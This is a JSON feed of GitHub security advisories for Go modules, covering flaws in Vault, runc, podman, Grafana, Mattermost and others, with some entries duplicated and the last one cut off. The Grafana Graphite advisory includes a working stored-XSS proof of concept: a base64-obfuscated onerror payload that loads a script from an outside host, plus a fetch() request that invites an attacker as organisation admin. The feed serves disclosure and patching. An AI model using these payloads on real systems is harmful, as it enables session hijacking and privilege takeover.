{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0620\">https://nvd.nist.gov/vuln/detail/CVE-2023-0620</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1\">https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/pull/19591\">https://github.com/hashicorp/vault/pull/19591</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.11.9\">https://github.com/hashicorp/vault/releases/tag/v1.11.9</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.12.5\">https://github.com/hashicorp/vault/releases/tag/v1.12.5</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.13.1\">https://github.com/hashicorp/vault/releases/tag/v1.13.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v3hp-mcj5-pg39\">https://github.com/advisories/GHSA-v3hp-mcj5-pg39</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v3hp-mcj5-pg39",
            "title": "[github.com/hashicorp/vault] HashiCorp Vault’s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File",
            "date_modified": "2023-03-30T20:43:56.000Z",
            "date_published": "2023-03-30T03:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v3hp-mcj5-pg39"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0620\">https://nvd.nist.gov/vuln/detail/CVE-2023-0620</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1\">https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/pull/19591\">https://github.com/hashicorp/vault/pull/19591</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.11.9\">https://github.com/hashicorp/vault/releases/tag/v1.11.9</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.12.5\">https://github.com/hashicorp/vault/releases/tag/v1.12.5</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.13.1\">https://github.com/hashicorp/vault/releases/tag/v1.13.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v3hp-mcj5-pg39\">https://github.com/advisories/GHSA-v3hp-mcj5-pg39</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v3hp-mcj5-pg39",
            "title": "[github.com/hashicorp/vault] HashiCorp Vault’s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File",
            "date_modified": "2023-03-30T20:43:56.000Z",
            "date_published": "2023-03-30T03:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v3hp-mcj5-pg39"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0620\">https://nvd.nist.gov/vuln/detail/CVE-2023-0620</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1\">https://discuss.hashicorp.com/t/hcsec-2023-12-vault-s-microsoft-sql-database-storage-backend-vulnerable-to-sql-injection-via-configuration-file/52080/1</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/pull/19591\">https://github.com/hashicorp/vault/pull/19591</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.11.9\">https://github.com/hashicorp/vault/releases/tag/v1.11.9</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.12.5\">https://github.com/hashicorp/vault/releases/tag/v1.12.5</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/releases/tag/v1.13.1\">https://github.com/hashicorp/vault/releases/tag/v1.13.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v3hp-mcj5-pg39\">https://github.com/advisories/GHSA-v3hp-mcj5-pg39</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v3hp-mcj5-pg39",
            "title": "[github.com/hashicorp/vault] HashiCorp Vault’s Microsoft SQL Database Storage Backend Vulnerable to SQL Injection Via Configuration File",
            "date_modified": "2023-03-30T20:43:56.000Z",
            "date_published": "2023-03-30T03:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v3hp-mcj5-pg39"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It was found that AppArmor, and potentially SELinux, can be bypassed when <code>/proc</code> inside the container is symlinked with a specific mount configuration.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in runc v1.1.5, by prohibiting symlinked <code>/proc</code>: <a href=\"https://github.com/opencontainers/runc/pull/3785\">https://github.com/opencontainers/runc/pull/3785</a></p>\n<p>This PR fixes CVE-2023-27561 as well.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Avoid using an untrusted container image.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/opencontainers/runc/security/advisories/GHSA-g2j6-57v7-gm8c\">https://github.com/opencontainers/runc/security/advisories/GHSA-g2j6-57v7-gm8c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28642\">https://nvd.nist.gov/vuln/detail/CVE-2023-28642</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/pull/3785\">https://github.com/opencontainers/runc/pull/3785</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g2j6-57v7-gm8c\">https://github.com/advisories/GHSA-g2j6-57v7-gm8c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g2j6-57v7-gm8c",
            "title": "[github.com/opencontainers/runc] runc AppArmor bypass with symlinked /proc",
            "date_modified": "2023-03-30T20:20:32.000Z",
            "date_published": "2023-03-30T20:20:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g2j6-57v7-gm8c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It was found that rootless runc makes <code>/sys/fs/cgroup</code> writable in following conditons:</p>\n<ol>\n<li>when runc is executed inside the user namespace, and the <code>config.json</code> does not specify the cgroup namespace to be unshared (e.g.., <code>(docker|podman|nerdctl) run --cgroupns=host</code>, with Rootless Docker/Podman/nerdctl)</li>\n<li>or, when runc is executed outside the user namespace, and <code>/sys</code> is mounted with <code>rbind, ro</code> (e.g., <code>runc spec --rootless</code>; this condition is very rare)</li>\n</ol>\n<p>A container may gain the write access to user-owned cgroup hierarchy <code>/sys/fs/cgroup/user.slice/...</code> on the host .\nOther users's cgroup hierarchies are not affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>v1.1.5 (planned)</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Condition 1: Unshare the cgroup namespace (<code>(docker|podman|nerdctl) run --cgroupns=private)</code>. This is the default behavior of Docker/Podman/nerdctl on cgroup v2 hosts.</li>\n<li>Condition 2 (very rare): add <code>/sys/fs/cgroup</code> to <code>maskedPaths</code></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/opencontainers/runc/security/advisories/GHSA-m8cg-xc2p-r3fc\">https://github.com/opencontainers/runc/security/advisories/GHSA-m8cg-xc2p-r3fc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-25809\">https://nvd.nist.gov/vuln/detail/CVE-2023-25809</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/commit/0d62b950e60f6980b54fe3bafd9a9c608dc1df17\">https://github.com/opencontainers/runc/commit/0d62b950e60f6980b54fe3bafd9a9c608dc1df17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m8cg-xc2p-r3fc\">https://github.com/advisories/GHSA-m8cg-xc2p-r3fc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m8cg-xc2p-r3fc",
            "title": "[github.com/opencontainers/runc] rootless: `/sys/fs/cgroup` is writable when cgroupns isn't unshared in runc",
            "date_modified": "2023-03-30T20:17:26.000Z",
            "date_published": "2023-03-30T20:17:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m8cg-xc2p-r3fc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos 0.9.0 and prior.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-4849\">https://nvd.nist.gov/vuln/detail/CVE-2022-4849</a></li>\n<li><a href=\"https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948\">https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948</a></li>\n<li><a href=\"https://huntr.dev/bounties/404ce7dd-f345-4d98-ad80-c53ac74f4e5c\">https://huntr.dev/bounties/404ce7dd-f345-4d98-ad80-c53ac74f4e5c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-642q-2q68-9j3p\">https://github.com/advisories/GHSA-642q-2q68-9j3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-642q-2q68-9j3p",
            "title": "[github.com/usememos/memos] usememos/memos Cross-Site Request Forgery vulnerability",
            "date_modified": "2023-03-30T19:55:17.000Z",
            "date_published": "2022-12-29T18:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-642q-2q68-9j3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>runc 1.0.0-rc95 through 1.1.4 has Incorrect Access Control leading to Escalation of Privileges, related to <code>libcontainer/rootfs_linux.go</code>. To exploit this, an attacker must be able to spawn two containers with custom volume-mount configurations, and be able to run custom images. NOTE: this issue exists because of a CVE-2019-19921 regression.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-27561\">https://nvd.nist.gov/vuln/detail/CVE-2023-27561</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/issues/2197#issuecomment-1437617334\">https://github.com/opencontainers/runc/issues/2197#issuecomment-1437617334</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/issues/3751\">https://github.com/opencontainers/runc/issues/3751</a></li>\n<li><a href=\"https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9\">https://gist.github.com/LiveOverflow/c937820b688922eb127fb760ce06dab9</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html\">https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/pull/3785\">https://github.com/opencontainers/runc/pull/3785</a></li>\n<li><a href=\"https://github.com/opencontainers/runc/releases/tag/v1.1.5\">https://github.com/opencontainers/runc/releases/tag/v1.1.5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vpvm-3wq2-2wvm\">https://github.com/advisories/GHSA-vpvm-3wq2-2wvm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vpvm-3wq2-2wvm",
            "title": "[github.com/opencontainers/runc] Opencontainers runc Incorrect Authorization vulnerability",
            "date_modified": "2023-03-29T14:46:17.000Z",
            "date_published": "2023-03-03T21:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vpvm-3wq2-2wvm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Gophish through 0.12.1 allows attackers to cause a Denial of Service (DoS) via a crafted payload involving autofocus.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-45003\">https://nvd.nist.gov/vuln/detail/CVE-2022-45003</a></li>\n<li><a href=\"https://github.com/gophish/gophish/releases/tag/v0.12.1\">https://github.com/gophish/gophish/releases/tag/v0.12.1</a></li>\n<li><a href=\"https://pastebin.com/z5MD3z8c\">https://pastebin.com/z5MD3z8c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8gg8-wr4j-v2wr\">https://github.com/advisories/GHSA-8gg8-wr4j-v2wr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8gg8-wr4j-v2wr",
            "title": "[github.com/gophish/gophish] Gophish vulnerable to Denial of Service via crafted payload involving autofocus",
            "date_modified": "2023-03-28T02:42:25.000Z",
            "date_published": "2023-03-22T21:30:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8gg8-wr4j-v2wr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Time-of-check Time-of-use (TOCTOU) flaw was found in podman. This issue may allow a malicious user to replace a normal file in a volume with a symlink while exporting the volume, allowing for access to arbitrary files on the host file system.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0778\">https://nvd.nist.gov/vuln/detail/CVE-2023-0778</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2168256\">https://bugzilla.redhat.com/show_bug.cgi?id=2168256</a></li>\n<li><a href=\"https://github.com/containers/podman/pull/17528\">https://github.com/containers/podman/pull/17528</a></li>\n<li><a href=\"https://github.com/containers/podman/pull/17532\">https://github.com/containers/podman/pull/17532</a></li>\n<li><a href=\"https://github.com/containers/podman/commit/6ca857feb07a5fdc96fd947afef03916291673d8\">https://github.com/containers/podman/commit/6ca857feb07a5fdc96fd947afef03916291673d8</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-0778\">https://access.redhat.com/security/cve/CVE-2023-0778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qwqv-rqgf-8qh8\">https://github.com/advisories/GHSA-qwqv-rqgf-8qh8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qwqv-rqgf-8qh8",
            "title": "[github.com/containers/podman/v4] Podman Time-of-check Time-of-use (TOCTOU) Race Condition",
            "date_modified": "2023-03-27T22:33:22.000Z",
            "date_published": "2023-03-27T21:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qwqv-rqgf-8qh8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>public/app/features/panel/panel_ctrl.ts</code> in Grafana before 6.2.5 allows HTML Injection in panel drilldown links (via the Title or url field).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-13068\">https://nvd.nist.gov/vuln/detail/CVE-2019-13068</a></li>\n<li><a href=\"https://github.com/grafana/grafana/issues/17718\">https://github.com/grafana/grafana/issues/17718</a></li>\n<li><a href=\"https://github.com/grafana/grafana/releases/tag/v6.2.5\">https://github.com/grafana/grafana/releases/tag/v6.2.5</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20190710-0001/\">https://security.netapp.com/advisory/ntap-20190710-0001/</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/171500/Grafana-6.2.4-HTML-Injection.html\">http://packetstormsecurity.com/files/171500/Grafana-6.2.4-HTML-Injection.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7phr-6cc9-4m5q\">https://github.com/advisories/GHSA-7phr-6cc9-4m5q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7phr-6cc9-4m5q",
            "title": "[github.com/grafana/grafana] Grafana Cross-site Scripting vulnerability",
            "date_modified": "2023-03-27T22:13:46.000Z",
            "date_published": "2022-05-24T16:49:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7phr-6cc9-4m5q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost version 7.1.x and earlier fails to sufficiently process a specifically crafted GIF file when it is uploaded while drafting a post, which allows authenticated users to cause resource exhaustion while processing the file, resulting in server-side Denial of Service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3257\">https://nvd.nist.gov/vuln/detail/CVE-2022-3257</a></li>\n<li><a href=\"https://hackerone.com/reports/1620170\">https://hackerone.com/reports/1620170</a></li>\n<li><a href=\"https://mattermost.com/security-updates/\">https://mattermost.com/security-updates/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m7w4-q5vg-5xfp\">https://github.com/advisories/GHSA-m7w4-q5vg-5xfp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m7w4-q5vg-5xfp",
            "title": "[github.com/mattermost/mattermost-server/v6] Mattermost subject to Denial of Service via upload of special GIF",
            "date_modified": "2023-03-27T14:28:00.000Z",
            "date_published": "2022-09-25T00:00:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m7w4-q5vg-5xfp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3684\">https://nvd.nist.gov/vuln/detail/CVE-2021-3684</a></li>\n<li><a href=\"https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4\">https://github.com/openshift/assisted-installer/commit/2403dad3795406f2c5d923af0894e07bc8b0bdc4</a></li>\n<li><a href=\"https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a\">https://github.com/openshift/assisted-installer/commit/f3800cfa3d64ce6dcd6f7b73f0578bb99bfdaf7a</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1985962\">https://bugzilla.redhat.com/show_bug.cgi?id=1985962</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g8xm-p2h4-v6jp\">https://github.com/advisories/GHSA-g8xm-p2h4-v6jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g8xm-p2h4-v6jp",
            "title": "[github.com/openshift/assisted-installer] OpenShift Assisted Installer leaks image pull secrets as plaintext in installation logs",
            "date_modified": "2023-03-24T21:59:19.000Z",
            "date_published": "2023-03-24T21:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g8xm-p2h4-v6jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x 